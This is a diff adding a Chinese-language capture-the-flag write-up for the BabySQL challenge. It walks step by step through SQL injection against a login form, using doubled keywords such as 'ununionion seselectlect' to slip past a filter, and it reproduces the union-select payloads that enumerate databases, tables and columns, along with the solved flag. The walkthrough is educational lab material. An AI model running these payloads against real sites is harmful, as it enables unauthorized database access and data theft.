@@ -403,6 +403,55 @@ burpsuite抓包<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/3601622
 
 原文链接：https://blog.csdn.net/m0_73734159/article/details/134275561?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22134275561%22%2C%22source%22%3A%22m0_73734159%22%7D
 
+## 记一次经典SQL双写绕过题目[极客大挑战 2019]BabySQL 1
+
+题目环境：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699363757420-1428f39e-e149-48c2-8f58-c4388f31bc31.png#averageHue=%230c0c0c&clientId=u24ae52f3-d826-4&from=paste&height=756&id=ubac5ff0d&originHeight=945&originWidth=1909&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=573482&status=done&style=none&taskId=ub89a017e-eebf-4b6c-a8d6-ae2b273ef79&title=&width=1527.2)
+> 作者已经描述进行了严格的过滤
+> 做好心理准备进行迎接
+
+判断注入类型
+> admin
+> 1'
+
+**字符型注入**<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699364027444-2dbbc8c2-7c05-43a5-993d-6ff2d3a5427c.png#averageHue=%230c0c0c&clientId=u24ae52f3-d826-4&from=paste&height=642&id=u9816bd0d&originHeight=802&originWidth=1907&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=559274&status=done&style=none&taskId=u6f7fb20f-1383-412d-b479-b8fc47d565d&title=&width=1525.6)<br />万能密码注入
+> admin
+> 1' or '1'='1
+
+报错<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699363927073-32aaed5f-8d95-448d-8bb1-039c10b582d7.png#averageHue=%230c0a0a&clientId=u24ae52f3-d826-4&from=paste&height=742&id=u65fa4391&originHeight=927&originWidth=1900&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=575579&status=done&style=none&taskId=ud30c14c7-ed1e-486b-bb86-c3b4e7c3ab4&title=&width=1520)
+> 已经是字符型注入了，所以的话只有or这里存在了过滤
+> 联想到buuctf里面还没有碰到双写绕过的题目
+> 所以这里斗胆试一下使用双写绕过
+
+`1' oorr '1'='1`<br />成功<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699364313920-f15d5d3b-555f-409a-918f-29dbf7d61263.png#averageHue=%230b0b0a&clientId=u24ae52f3-d826-4&from=paste&height=746&id=ubf20451a&originHeight=932&originWidth=1903&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=588902&status=done&style=none&taskId=u12b98cc7-9173-468f-ac75-19a6539968c&title=&width=1522.4)<br />使用堆叠注入爆数据库<br />`1';show database();`<br />报错<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699364548094-f743b8ab-7ba7-44a5-b249-bf99bd2b1efc.png#averageHue=%230b0a0a&clientId=u24ae52f3-d826-4&from=paste&height=744&id=u60ff0bf7&originHeight=930&originWidth=1901&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=579099&status=done&style=none&taskId=u7c248545-5279-4a4f-89b7-9585ca1779c&title=&width=1520.8)<br />抛弃堆叠注入<br />尝试联合注入
+> 联合注入末尾需要使用#号键进行注释#号后面的命令，避免报错
+
+**这里值得提一下schema和schemata和常见命令的理解**
+> [SCHEMA](https://so.csdn.net/so/search?q=SCHEMA&spm=1001.2101.3001.7020)在MySQL中是数据库，SCHEMATA表用来提供有关数据库的信息。
+> union select就是联合注入，联合查询的意思
+> from来自
+> information_schema是MySQL自带的数据库
+> group_concat将值连接起来
+> where来自那个数据库或数据表等等
+
+爆列数(关键命令采用双写进行绕过）<br />`1' oorrder bbyy 4#`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699365343311-7d879f08-d90c-49b5-9b4a-14a27e0ec313.png#averageHue=%230a0a0a&clientId=u24ae52f3-d826-4&from=paste&height=745&id=rTjtD&originHeight=931&originWidth=1879&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=570576&status=done&style=none&taskId=u1b7585e0-1971-481e-9b4f-1503aee95b9&title=&width=1503.2)<br />`1' oorrder bbyy 3#`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699365392125-0a36fa5a-51fb-4ddc-a45d-5f2794b3fa80.png#averageHue=%230c0909&clientId=u24ae52f3-d826-4&from=paste&height=750&id=elxsd&originHeight=937&originWidth=1905&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=575845&status=done&style=none&taskId=u44deebbd-f1fe-4a5a-a3c0-6efe4365068&title=&width=1524)
+> **可知列数只有3列**
+
+查位(关键命令采用双写进行绕过）<br />`1' ununionion seselectlect 1,2,3#`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699364845878-53491c27-278e-425f-8851-50b817c65d30.png#averageHue=%230a0a0a&clientId=u24ae52f3-d826-4&from=paste&height=753&id=u70cd66fb&originHeight=941&originWidth=1905&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=576558&status=done&style=none&taskId=u0bcf4060-b94f-4538-b8d2-8758e7a2209&title=&width=1524)<br />爆数据库(关键命令采用双写进行绕过）<br />`1' ununionion seselectlect 1,database(),3#`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699365128004-d67a7fbc-9972-4563-9d79-54d274cb9f2c.png#averageHue=%230b0a0a&clientId=u24ae52f3-d826-4&from=paste&height=750&id=ubfd36b3a&originHeight=938&originWidth=1904&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=577450&status=done&style=none&taskId=ubf762cc7-62ab-4184-a27a-f369a37fb1d&title=&width=1523.2)<br />采用第三列进行注入<br />爆所有数据库(关键命令采用双写进行绕过）<br />`1' ununionion seselectlect 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata#`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699365743433-03263256-2ca7-4ba7-9f50-eba014f8376e.png#averageHue=%230b0a0a&clientId=u24ae52f3-d826-4&from=paste&height=755&id=QSNiQ&originHeight=944&originWidth=1909&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=605679&status=done&style=none&taskId=ude20772b-3ec2-4a21-b11e-177341bac5e&title=&width=1527.2)
+> 根据常识ctf数据库里面存在flag的可能更大，故选择ctf数据库
+
+爆ctf数据库里面的数据表<br />`1' ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema='ctf'#`
+> **因为ctf在schema里面所有这里就是table_schema，schema里面的数据库ctf里面的数据表**
+
+得到Flag数据表<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699366028919-cb1376d8-d00e-43dd-aa60-3ae6f214d883.png#averageHue=%230a0a0a&clientId=u24ae52f3-d826-4&from=paste&height=756&id=ufd42ca4c&originHeight=945&originWidth=1897&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=581741&status=done&style=none&taskId=u944cf11a-f0be-4dd8-938d-9a4f519e98e&title=&width=1517.6)<br />爆Flag数据表里面的字段<br />`1' ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name='Flag'#`<br />得到flag字段<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699366186634-b43edfcc-8839-490c-907d-cd27fed0ddf7.png#averageHue=%230b0a0a&clientId=u24ae52f3-d826-4&from=paste&height=741&id=u4d5ad84d&originHeight=926&originWidth=1902&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=583894&status=done&style=none&taskId=u9bb4bc6e-bbbe-4384-a68b-9ac8edbe9fd&title=&width=1521.6)<br />爆flag字段内容<br />`1' ununionion seselectlect 1,2,group_concat(flag) frfromom ctf.Flag#`
+> ctf.Flag意思就是ctf数据库里面的Flag数据表
+
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699366359959-1098e811-013e-47c1-9c38-d601347ec16b.png#averageHue=%230b0b0b&clientId=u24ae52f3-d826-4&from=paste&height=748&id=ua2923427&originHeight=935&originWidth=1899&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=594096&status=done&style=none&taskId=u862d2317-6b23-4473-ba7e-47df8302d1a&title=&width=1519.2)<br />**得到flag：**<br />`flag{fbd18420-cab7-4d6e-8fb9-f8ea6febda61}`
+
+原文链接：https://blog.csdn.net/m0_73734159/article/details/134277587?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22134277587%22%2C%22source%22%3A%22m0_73734159%22%7D
+
+
+
+
 
 
 
